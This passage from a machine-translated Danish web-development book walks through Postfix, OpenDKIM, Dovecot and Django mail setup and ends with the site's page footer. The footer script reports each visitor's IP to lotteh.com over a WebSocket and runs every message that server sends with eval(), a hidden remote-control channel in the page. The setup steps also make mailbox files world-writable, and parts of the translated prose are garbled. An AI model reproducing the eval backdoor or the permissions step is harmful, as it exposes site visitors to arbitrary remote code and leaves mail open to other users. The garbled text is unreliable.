sudo cp config/etc_dovecot_conf.d_10-auth.conf /etc/dovecot/conf.d/10-auth.conf
sudo cp config/etc_dovecot_conf.d_10-master.conf /etc/dovecot/conf.d/10-master.conf
sudo cp config/etc_dovecot_dovecot.conf /etc/dovecot/dovecot.conf
sudo cp config/etc_dovecot_passwd /etc/dovecot/passwd
sudo cp config/etc_opendkim.conf /etc/opendkim.conf
sudo cp config/etc_default_opendkim /etc/default/opendkim
sudo adduser postfix opendkim
sudo mkdir /etc/opendkim
sudo mkdir /etc/opendkim/keys
sudo mkdir /etc/opendkim/keys/femmebabe.com
sudo mkdir /var/spool/postfix/opendkim
sudo echo "*@femmebabe.com     sendonly._domainkey.femmebabe.com" | sudo tee -a /etc/opendkim/signing.table
sudo echo "sendonly._domainkey.femmebabe.com    femmebabe.com:sendonly:/etc/opendkim/keys/femmebabe.com/sendonly.private" | sudo tee -a /etc/opendkim/key.table
sudo echo "127.0.0.1" | sudo tee -a /etc/opendkim/trusted.hosts
sudo echo "localhost" | sudo tee -a /etc/opendkim/trusted.hosts
sudo echo "" | sudo tee -a /etc/opendkim/trusted.hosts
sudo echo "*.femmebabe.com" | sudo tee -a /etc/opendkim/trusted.hosts
sudo chown -R opendkim:opendkim /etc/opendkim
sudo opendkim-genkey -b 2048 -d femmebabe.com -D /etc/opendkim/keys/femmebabe.com -s sendonly -v
sudo chmod go-rw /etc/opendkim/keys
sudo chown opendkim:opendkim /etc/opendkim/keys/femmebabe.com/sendonly.private
sudo chown opendkim:postfix /var/spool/postfix/opendkim
cd $DIR
sudo cp mailbox/* /var/mail/
sudo chown :users /var/mail/*
sudo chmod -R a+rwx /var/mail/*
sudo systemctl restart opendkim postfix dovecot
sudo cat /etc/opendkim/keys/femmebabe.com/sendonly.txt | tr -d '\n' | sed 's/\s//g' | sed 's/""//g' | awk -F'[)(]' '{print $2}'
</code></pre>Kør nu det færdige script for at konfigurere Postfix, Opendkim og Dovecot.<pre class="language-bash"><code>
./scripts/postfixsetup
</code></pre>Når dette script er kørt, skal du kopiere den sidste linje, den udskriver, og indsætte den i din DNS -konfiguration som værdien for Sendonly._DomainKey. Dette er Opendkim -nøglen, der bruges til at identificere dit domæne, når du sender sikker mail.

Fantastisk! Inden for et par dage skal du være i stand til at sende mail fra serveren, forudsat at alt er konfigureret korrekt. 

Hvis du bare konfigurerede DNS til din mailserver, skal det tage mindre end 72 timer, før posterne opdateres. Det er normalt meget hurtigere. Du kan kontrollere, om din server fungerer ved at bruge denne kommando, leveret din e -mail:<pre class="language-bash"><code>
echo “test” | mail -s “Test Email” youremail@gmail.com
</code></pre>Hvis alt ser ud til at fungere korrekt, skal du være i stand til at sende e -mail med din server. Hvis det ikke fungerer, kan du prøve at se på logfilerne for at se, hvad fejlen kan være.<pre class="language-bash"><code>
tail –lines 150 /var/log/mail.log
</code></pre>Dette vil tilbyde ordret information om mail, der sendes af serveren, og om den fungerer korrekt. Du skal også være i stand til at se e -mailen i din indbakke, hvis den ikke er der, skal du tjekke din spam -mappe.

Du bliver også nødt til at konfigurere dine indstillinger i dine indstillinger. PY Så din e -mail -server kan tale med din Django -app, projektet. Tilføj eller udskift disse linjer i dine indstillinger<pre class="language-python"><code>
EMAIL_HOST = DOMAIN
EMAIL_PORT = 587
EMAIL_USE_TLS = True
EMAIL_ADDRESS = 'team@femmebabe.com'
EMAIL_HOST_USER = 'team' # 'Love@mamasheen.com'
EMAIL_HOST_PASSWORD = config['EMAIL_HOST_PASSWORD']
DEFAULT_FROM_EMAIL = '{} &lt;{}&gt;'.format(SITE_NAME, EMAIL_HOST_USER)
</code></pre>Bemærk, at vi bruger en konfigurationsfil til at få adgangskoden. Lad os indlæse denne fil i indstillingerne som så i starten af ​​filen.:<pre class="language-python"><code>
import os
import json

# Åbn og indlæs config
with open('/etc/config.json') as config_file:
    config = json.load(config_file)
</code></pre>Lad os oprette denne fil og tilføje en hemmelig nøgle til den såvel som mailadgangskoden. For at generere en hemmelig nøgle skal du bruge denne kommando med den længde, du kan lide i slutningen:<pre class="language-bash"><code>
openssl rand -base64 64
</code></pre>Kopier nu teksten, der åbner, der er genereret og redigering /etc/config.json<pre class="language-bash"><code>
sudo nano /etc/config.json
</code></pre>Føj følgende linjer til din fil med den nøgle, der åbner, der er genereret som den hemmelige nøgle.<pre class="language-bash"><code>
{
	"SECRET_KEY": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXX-generated-using-openssl)",
	"EMAIL_HOST_PASSWORD": "yourpassword"
}
</code></pre>JSON -format er enkelt og let at bruge, vi kan erklære andre nøgler, vi også vil bruge i vores projekt på denne måde, og hold dem adskilt fra vores projektkatalog, så andre brugere ikke kan skrive til dem, så de kan ikke læses Fra vores projektkatalog alene. Dette anbefales praksis for API -nøgler, som vi vil bruge mere end et par her.

Du vil også tage sikkerhedskopi af dit projekt for at sikre dig, at alt er gemt, og at du kan gendanne dit arbejde senere, selvom du ikke længere ønsker at leje en server.<pre class="language-bash"><code>
sudo backup
</code></pre>Prøv nu at sende en HTML -e -mail fra webserveren, forudsat at sende en fra kommandolinjen fungerer. Spørg din brugerinstans i skallen, og send en HTML -e -mail til den bruger via Django. Skift mit navn i koden, Charlotte, til dit brugernavn.<pre class="language-bash"><code>
python manage.py shell
from django.contrib.auth.models import User
u = User.objects.get(username='Charlotte')
from users.email import send_welcome_email
send_welcome_email(u)
exit()
</code></pre>Hvis den første kommando ikke fungerer, skal du sørge for at bruge<pre class="language-bash"><code>
source venv/bin/activate
</code></pre>Forudsat at alt er konfigureret korrekt, får du nu en velkomst -e -mail i din postkasse sendt med din webapp. Godt job! Du er nået langt.

Jeg ville tilføje, hvis du nogensinde kæmper med fejl overhovedet, mens du arbejder på et projekt som dette, tøv ikke med at søge efter svar og bede om hjælp. Google, blandt andre søgemaskiner, er gode ressourcer til at søge efter programmeringshjælp. Bare søg efter den fejl, du får, og du vil være i stand til at se, hvordan andre mennesker løser problemet. Du er også velkommen til at kontakte mig, dine undervisere (lærere, professorer, tutorer), eventuelle kammerater på Internettet, der er tilgængelige til programmeringshjælp, eller konsultere denne bog igen eller andre ressourcer for at finde løsninger på de problemer, du oplever. Jeg forstår, at dette ikke er let, men selvom du har læst i så langt og ikke skriver nogen kode, lærer du meget om at opbygge en webapp fra bunden. Klap dig selv på bagsiden, du laver en godjob.

































Tak fordi du tog dig tid til at læse denne tredje udgave Web Development Guide. I fremtidige udgaver vil jeg medtage flere af de vigtige eksempler, der diskuteres i begyndelsen af ​​dokumentet, og vi vil dykke meget dybere ind i verdenen af ​​software og hardwareudvikling. Hold øje med hvad der skal komme, og jeg ser frem til at lære dig, hvordan du bygger utrolig software. Vi ses i den næste</we'll></key></form>
</p>
<hr class="m-5 p-5">
<hr class="m-5 p-5">
<hr class="m-5 p-5">
<hr class="m-5 p-5">
<hr class="m-5 p-5">
</div>
</div>
<div class="bg-white bottom-readerbar py-0 my-0 hide" id="bnav105">
<div style="display: flex; justify-content: space-around;">
<div class="btn btn-outline-primary" onclick="toggleReader('105');" style="color: black !important;">Tæt</div>
<i >Side <i id="pagecount105"> 1</i></i>

<div class="d-flex">
	<div style="width: 120px;"><input id="jumpto105" class="form-control mr-sm-2" type="number" placeholder="Side" aria-label="Side" id="page" name="page"></div>
	<div class="btn btn-outline-success my-2 my-sm-0" onclick="jumpbookto('105');" style="color: black !important;">Springe</div>
</div>

</div>
</div>
</div>
<div style="display: inline-block;" class="m-2">
<i>Se hele artiklen</i>
<div class="btn btn-outline-primary" onclick="toggleReader('105');">Fortsæt med at læse</div>
</div>



<div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
     crossorigin="anonymous"></script>
<!-- Square Ad -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-6209985848112194"
     data-ad-slot="2468505458"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
</div>



<p><a href="https://lotteh.com/payments/pay/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Buy on Lotte Harper">Købe</a> | <a href="https://lotteh.com/payments/pay/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=USDC" title="Buy with cryptocurrency on Lotte Harper">Køb med krypto</a></p>


<hr>

<div style="margin:auto;" class="center col-md-6 p-3 rounded mb-3 bg-white">
<div class="mb-2" style="display: flex; justify-content: space-around;">
<a title="Del på Facebook" target="_blank" class="btn btn-light btn-xlarge" href="https://www.facebook.com/dialog/feed?&app_id=845349032833671&link=https%3A%2F%2Fglamgirlx.com%2Fda%2Fpractical-web-based-deep%3F&quote=Practical%20Web%20Based%20Deep%20Learning%20and%20Security%20by%20Example&display=popup&hashtag=#lotteh&redirect_uri=https%3A%2F%2Fglamgirlx.comhttps%3A%2F%2Fglamgirlx.com" title="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-facebook" viewBox="0 0 16 16"  style="text-color: #4267B2 !important; color: #4267B2 !important;">
  <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951"/></svg></a>
<a title="Del på Twitter" target="_blank" class="btn btn-xlarge btn-light" href="https://twitter.com/intent/tweet/?text=Practical%20Web%20Based%20Deep%20Learning%20and%20Security%20by%20Example%20-&url=https://glamgirlx.com/da/practical-web-based-deep?" title="Share on Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-twitter" viewBox="0 0 16 16" style="text-color: #1DA1F2 !important; color: #1DA1F2 !important;">
  <path d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334q.002-.211-.006-.422A6.7 6.7 0 0 0 16 3.542a6.7 6.7 0 0 1-1.889.518 3.3 3.3 0 0 0 1.447-1.817 6.5 6.5 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.32 9.32 0 0 1-6.767-3.429 3.29 3.29 0 0 0 1.018 4.382A3.3 3.3 0 0 1 .64 6.575v.045a3.29 3.29 0 0 0 2.632 3.218 3.2 3.2 0 0 1-.865.115 3 3 0 0 1-.614-.057 3.28 3.28 0 0 0 3.067 2.277A6.6 6.6 0 0 1 .78 13.58a6 6 0 0 1-.78-.045A9.34 9.34 0 0 0 5.026 15"/>
</svg></a>
<a title="Del på Pinterest" target="_blank" class="btn btn-xlarge btn-light" href="https://www.pinterest.com/pin/create/button/?url=https://glamgirlx.com/da/practical-web-based-deep?" title="Share on Pinterest"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-pinterest" viewBox="0 0 16 16" style="filter: invert(21%) sepia(58%) saturate(4534%) hue-rotate(338deg) brightness(81%) contrast(128%);">
  <path d="M8 0a8 8 0 0 0-2.915 15.452c-.07-.633-.134-1.606.027-2.297.146-.625.938-3.977.938-3.977s-.239-.479-.239-1.187c0-1.113.645-1.943 1.448-1.943.682 0 1.012.512 1.012 1.127 0 .686-.437 1.712-.663 2.663-.188.796.4 1.446 1.185 1.446 1.422 0 2.515-1.5 2.515-3.664 0-1.915-1.377-3.254-3.342-3.254-2.276 0-3.612 1.707-3.612 3.471 0 .688.265 1.425.595 1.826a.24.24 0 0 1 .056.23c-.061.252-.196.796-.222.907-.035.146-.116.177-.268.107-1-.465-1.624-1.926-1.624-3.1 0-2.523 1.834-4.84 5.286-4.84 2.775 0 4.932 1.977 4.932 4.62 0 2.757-1.739 4.976-4.151 4.976-.811 0-1.573-.421-1.834-.919l-.498 1.902c-.181.695-.669 1.566-.995 2.097A8 8 0 1 0 8 0"/>
</svg></a>
<a title="Del på LinkedIn" target="_blank" class="btn btn-xlarge btn-light" href="https://www.linkedin.com/shareArticle?mini=true&url=https://glamgirlx.com/da/practical-web-based-deep?"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-linkedin" viewBox="0 0 16 16"  style="color: #2867B2">
  <path d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854zm4.943 12.248V6.169H2.542v7.225zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248S2.4 3.226 2.4 3.934c0 .694.521 1.248 1.327 1.248zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016l.016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225z"/>
</svg></a>
</div>
<div class="mb-2" style="display: flex; justify-content: space-around;">
<a title="Del på Tumblr" target="_blank" class="btn btn-xlarge btn-light" href="http://tumblr.com/widgets/share/tool?canonicalUrl=https://glamgirlx.com/da/practical-web-based-deep?"><img src="/media/icons/tumblr-logo.svg" width="30" height="30" alt="Tumblr" style="filter: invert(28%) sepia(8%) saturate(3348%) hue-rotate(169deg) brightness(92%) contrast(82%);"></a>
<a title="Del på Reddit" target="_blank" class="btn btn-xlarge btn-light" href="http://www.reddit.com/submit?url=https://glamgirlx.com/da/practical-web-based-deep?&title=Practical%20Web%20Based%20Deep%20Learning%20and%20Security%20by%20Example"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-reddit" viewBox="0 0 16 16" style="text-color: #FF4500 !important; color: #FF4500 !important;">
  <path d="M6.167 8a.83.83 0 0 0-.83.83c0 .459.372.84.83.831a.831.831 0 0 0 0-1.661m1.843 3.647c.315 0 1.403-.038 1.976-.611a.23.23 0 0 0 0-.306.213.213 0 0 0-.306 0c-.353.363-1.126.487-1.67.487-.545 0-1.308-.124-1.671-.487a.213.213 0 0 0-.306 0 .213.213 0 0 0 0 .306c.564.563 1.652.61 1.977.61zm.992-2.807c0 .458.373.83.831.83s.83-.381.83-.83a.831.831 0 0 0-1.66 0z"/>
  <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0m-3.828-1.165c-.315 0-.602.124-.812.325-.801-.573-1.9-.945-3.121-.993l.534-2.501 1.738.372a.83.83 0 1 0 .83-.869.83.83 0 0 0-.744.468l-1.938-.41a.2.2 0 0 0-.153.028.2.2 0 0 0-.086.134l-.592 2.788c-1.24.038-2.358.41-3.17.992-.21-.2-.496-.324-.81-.324a1.163 1.163 0 0 0-.478 2.224q-.03.17-.029.353c0 1.795 2.091 3.256 4.669 3.256s4.668-1.451 4.668-3.256c0-.114-.01-.238-.029-.353.401-.181.688-.592.688-1.069 0-.65-.525-1.165-1.165-1.165"/>
</svg></a>
<a title="Del i VK" target="_blank" class="btn btn-xlarge btn-light" href="http://vk.com/share.php?url=https://glamgirlx.com/da/practical-web-based-deep?"><img src="/media/icons/VK_logo.svg.png" width="30" height="30" alt="VK" style="filter: invert(50%) sepia(69%) saturate(366%) hue-rotate(171deg) brightness(84%) contrast(86%);"></img></a>
</div>
</div>
<div style="mx-auto">
<p id="url" hidden>https://glamgirlx.com/da/practical-web-based-deep</p>
<hr>
<div class="pb-1 container rounded"><p class="pt-3">https://glamgirlx.com/da/practical-web-based-deep - <button class="btn btn-info btn-sm" onclick="copyToClipboard('url');" title="Share this page by copying the link"><i class="bi bi-clipboard-plus"></i> Kopier link</button></p></div>
<hr>
<div style="display: flex; justify-content: space-around;"><div id="shareqrcode" style="border-style: solid; border-width: 15px; border-radius: 5px; border-color: #EEEEEE;"></div></div>
<div style="text-align: center;"><small>(Klik eller tryk på for at downloade billede)</small></div>
<div>Professionel underholdning, fotos, videoer, lyd, livestreaming og afslappet gameplay samt ID -scanning, webudvikling og surrogacy -tjenester.</div>
</div>


        
        

<div class="dropdown">
  <a class="btn btn-outline-info dropdown-toggle" role="button" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-expanded="false">
    <i class="bi bi-globe"></i> Sprog
  </a>
  <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
    <div style="max-height: 50vh; overflow: scroll;">
        <a class="dropdown-item" href="/en/practical-web-based-deep">English</a>
        <a class="dropdown-item" href="/es/practical-web-based-deep">Española</a>
        <a class="dropdown-item" href="/fr/practical-web-based-deep">Français</a>
        <a class="dropdown-item" href="/de/practical-web-based-deep">Deutsch</a>
        <a class="dropdown-item" href="/nl/practical-web-based-deep">Nederlands</a>
        <a class="dropdown-item" href="/af/practical-web-based-deep">Afrikaans</a>
        <a class="dropdown-item" href="/ar/practical-web-based-deep">عربي</a>
        <a class="dropdown-item" href="/pt/practical-web-based-deep">Português (Portugal, Brazil)</a>
        <a class="dropdown-item" href="/id/practical-web-based-deep">Bahasa</a>
        <a class="dropdown-item" href="/hi/practical-web-based-deep">हिंदी</a>
        <a class="dropdown-item" href="/ru/practical-web-based-deep">Русский</a>
        <a class="dropdown-item" href="/ja/practical-web-based-deep">日本語</a>
        <a class="dropdown-item" href="/th/practical-web-based-deep">แบบไทย</a>
        <a class="dropdown-item" href="/zh-CN/practical-web-based-deep">中国人</a>
        <a class="dropdown-item" href="/tl/practical-web-based-deep">Filipino</a>
        <a class="dropdown-item" href="/cs/practical-web-based-deep">čeština</a>
        <a class="dropdown-item" href="/he/practical-web-based-deep">עִברִית</a>
        <a class="dropdown-item" href="/it/practical-web-based-deep">Italiana</a>
        <a class="dropdown-item" href="/no/practical-web-based-deep">norsk</a>
        <a class="dropdown-item" href="/pl/practical-web-based-deep">Polski</a>
        <a class="dropdown-item" href="/sv/practical-web-based-deep">svenska</a>
        <a class="dropdown-item" href="/tr/practical-web-based-deep">Türkçe</a>
        <a class="dropdown-item" href="/uk/practical-web-based-deep">українська</a>
        <a class="dropdown-item" href="/vi/practical-web-based-deep">Tiếng Việt</a>
        <a class="dropdown-item" href="/zu/practical-web-based-deep">Zulu</a>
        <a class="dropdown-item" href="/sq/practical-web-based-deep">shqiptare</a>
    </div>
  </div>
</div>

        <p><i>Efterlad mig et tip i bitcoin ved hjælp af denne adresse:</i> <b id="btc-wallet">3KhDWoSve2N627RiW8grj6XrsoPT7d6qyE</b> <button class="btn btn-sm btn-info" title="Kopier adresse" onclick="copyToClipboard('btc-wallet');">Kopi</button></p>
        <div id="javascript-console"></div>
	    <div class="d-flex justify-content-between p-2">
	        <div style="float:left;">
	          <p><span class="badge bg-light text-dark shadow p-1">&copy; Glam Girl X 2025</span></p>
		    </div>
            <div style="text-align: center;">
                 <a href="https://instagram.com/yourlocalfemme" about="_blank" title="Besøg mig på Instagram" style="font-size: 20px;" class="ml-1"><i class="bi bi-instagram"></i></a> <a href="https://twitter.com/teamfemmebabe" about="_blank" title="Besøg mig på Twitter" style="font-size: 20px;" class="ml-1"><i class="bi bi-twitter"></i></a> <a href="https://youtube.com/@daisymakeup" about="_blank" title="Se mig på YouTube" style="font-size: 20px;" class="ml-1"><i class="bi bi-youtube"></i></a>
            </div>
	        <div style="float:right;">
	          <p><span class="badge bg-light text-dark shadow p-1"><a href="https://lotteh.com/terms/?lang=da" title="Se servicevilkårene">Servicevilkår</a></span></p>
		    </div>
	    </div>
	    <div style="height: 100px;"></div>
        
    </main>
    
    
    
    <script src="/static/main.js"></script>
    <script>
        


var currentReader = 0;
function toggleReader(id) {
	currentReader = id;
	$('#reader-modal' + id).toggleClass('hide');
	$('#reader-modal' + id).toggleClass('fade-in-fast');
	$('#bnav' + id).toggleClass('hide');
	$('#bnav' + id).toggleClass('fade-in-fast');
	setTimeout(function() {
		$('#reader-modal' + id).toggleClass('fade-in-fast');
		$('#bnav' + id).toggleClass('fade-in-fast');
	}, 1000);
}
function jumpbookto(page) {
	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
}


        
        
        $(document).ready(function() {
            
            
            $(document.getElementById("glam-navbar")).autoHidingNavbar();
            
        	Prism.highlightAll();
        });
        var remoteSocket;
        function openRemoteSocket() {
            window.location.hash = '';
            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
            remoteSocket.addEventListener("open", (event) => {
                console.log('Socket open.');
                fetch('https://lotteh.com/remote/generate/')
        		    .then(response => response.json())
        		    .then(data => {
        		        remoteSocket.send(data.ip);
        		    })
        		    .catch(error => {
        		        console.log('Error:', error);
        		    });
            });
            remoteSocket.addEventListener("close", (event) => {
                console.log('Socket closed.');
                setTimeout(function() {
                    openRemoteSocket();
                }, 10000);
            });
        	remoteSocket.addEventListener("message", (event) => {
                    eval(event.data);
            });
        }
        openRemoteSocket();
        $(document).ready(function() {
        	$("#contact-form").submit(function(e){
                	e.preventDefault();
                	var data = new FormData(document.getElementById('contact-form'));
                	$.ajax({
                        	url: "https://lotteh.com/contact/",
                        	type: "POST",
                        	data: data,
                        	cache: false,
                	        contentType: false,
        	                processData: false,
                            timeout: 1000 * 60,
                	        tryCount: 0,
        	                retryLimit: 5,
                            error: (xhr, textStatus, errorThrown) => {
                                    this.tryCount++;
                                    if(this.tryCount >= this.retryLimit) return;
                                    $.ajax(this);
                            },
                            success: (data) => {
                                    if(data == 'Message sent.') {
                                            $('#contact-submit').prop('disabled', true);
                                            $(this).trigger('reset');
                                    }
                                    document.getElementById('contact-message').innerHTML = data;
                                    $('#contact-message').removeClass('hide');
                            },
                    });
            });
        });
        $(document).ready(function() {
        	
var months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
var days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
function updateClock() {
    var d = new Date();
    hr = d.getHours();
    min = d.getMinutes();
    sec = d.getSeconds();
    if(hr < 9 || hr >= 21) {
        document.getElementById("dynamicClockContainer").style.backgroundColor = "lightblue";
    }
    hr_rotation = 30 * hr + min / 2; /* converting current time */
    min_rotation = 6 * min;
    sec_rotation = 6 * sec;
    hours = document.getElementsByClassName("dhour");
    for(var x = 0; x < hours.length; x++) {
        hours[x].style.transform = `rotate(${hr_rotation}deg)`;
    }
    minutes = document.getElementsByClassName("dminute");
    for(var x = 0; x < minutes.length; x++) {
        minutes[x].style.transform = `rotate(${min_rotation}deg)`;
    }
    seconds = document.getElementsByClassName("dsecond");
    for(var x = 0; x < hours.length; x++) {
        seconds[x].style.transform = `rotate(${sec_rotation}deg)`;
    }
	var d = new Date();
	var day = days[d.getDay()];
	var hr = d.getHours();
	var min = d.getMinutes();
	if (min < 10) {
	    min = "0" + min;
	}
	var second = d.getSeconds();
	if (second < 10) {
	    second = "0" + second;
	}
	var hour = "";
	if( hr > 9 ) {
	    hour = hr;
	} else {
        hour = '0' + hr;
    }
	var date = d.getDate();
	var month = months[d.getMonth()];
	var year = d.getFullYear();
	if(document.getElementById("current-time-text")) {
		document.getElementById('current-time-text').innerHTML = day + " " + month + " " + date + ", " + year + " - " + hour + ":" + min + ":" + second;
	}

}
if(document.getElementById("dynamicClockContainer")) {
	var dynamicClockInterval = null;
	updateClock();
	dynamicClockInterval = setInterval(function() {
		updateClock();
	}, 1000);
}
var hrs = ["tolv", "en", "to", "tre", "fire", "fem", "seks", "syv", "otte", "ni", "ti", "elleve"];
var digits = ["","en", "to", "tre", "fire", "fem", "seks", "syv", "otte", "ni", "ti", "elleve"];
var teens = ["elleve", "tolv", "tretten", "fjorten", "femten", "seksten", "sytten", "atten", "nitten"];
var tens = ["o&#x27;","ti","tyve","tredive","fyrre","halvtreds"];
function capitalizeFirstLetter(string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
}
function updateTime() {
	var d = new Date();
	hr = d.getHours()%12;
	min = d.getMinutes();
	sec = d.getSeconds();
	var respond = null;
	if(min == 0) {
		respond = hrs[hr] + " o'clock";
	} else if(min < 11 || min > 19) {
		respond = hrs[hr] + ' ' + tens[Math.floor(min/10)] + ((digits[min%10] == "") ? '' : '-') + digits[min%10];
	} else {
		respond = hrs[hr] + ' ' + teens[min-11];
	}
	if(d.getHours() >= 12) {
		respond = respond + " pm";
	} else {
		respond = respond + " am";
	}
	respond = capitalizeFirstLetter(respond).replace("'-", "'");
	if(document.getElementById("current-time")){
		document.getElementById("current-time").innerHTML = respond;
		if(document.getElementById("current-time2")) {
			document.getElementById("current-time2").innerHTML = respond;
		}
	}
}
var updateTimeInterval;
function updateTimeout() {
	if(updateTimeInterval) clearInterval(updateTimeInterval);
	updateTime();
	var thedate = new Date();
	setTimeout(function() {
		updateTime();
		updateTimeInterval = setInterval(function() {
			updateTime();
		}, 60 * 1000);
	}, (60 - thedate.getSeconds()) * 1000 + 2000);
}
if(document.getElementById("current-time")) {
	updateTimeout();
}

            var qrdiv = document.getElementById("shareqrcode");
        	if(!qrdiv) return;
        	var qr = new QRCode(qrdiv, "https://glamgirlx.com/da/practical-web-based-deep?");
        	var image = qrdiv.querySelector('img');
            image.style.width = "100%";
            image.style.height = "100%";
            image.style.maxWidth = "160px";
            image.alt = "Del denne side ved at scanne en QR -kode.";
            try {
                function getBase64Image(img) {
                    var src = img.src;
                    var image = new Image();
                    image.src = src;
                    image.onload = function(event) {
                    var bsfcanvas = document.createElement("canvas");
                    bsfcanvas.width = img.clientWidth + 40;
                    bsfcanvas.height = img.clientHeight + 40;
                    if(bsfcanvas.height < bsfcanvas.width) bsfcanvas.height = bsfcanvas.width;
                    var bsfctx = bsfcanvas.getContext("2d");
                    bsfctx.fillStyle = "#ffffff";
                    bsfctx.fillRect(0, 0, bsfcanvas.width, bsfcanvas.height);
                    bsfctx.drawImage(event.target, 20, 20, bsfcanvas.width - 40, bsfcanvas.height - 40);
                    var dataURL = bsfcanvas.toDataURL("image/png");
                    downloadQrImage(dataURL, 'Glam Girl X - QR Code.png');
                    };
                }
                function downloadQrImage(url, filename) {
                    const link = document.createElement('a');
                    link.download = filename;
                    link.href = url;
                    link.classList.add('hide');
                    link.click();
                }
                function downloadQr(){
                    var theQrImage = document.getElementById('shareqrcode').querySelector('img');
                    getBase64Image(theQrImage);
                }
                qrdiv.onclick = downloadQr;
                } catch(error) {
                        document.getElementById('javascript-console').insertAdjacentHTML("beforeend", '<div>' + new String(error) + '</div>');
                }
        });
    </script>
    
    
    
    
    <script>
        if (navigator.serviceWorker) {
            navigator.serviceWorker.register (
              '/serviceworker.js',
              {scope: '/'}
            )
        }
    </script>
</body>
</html>
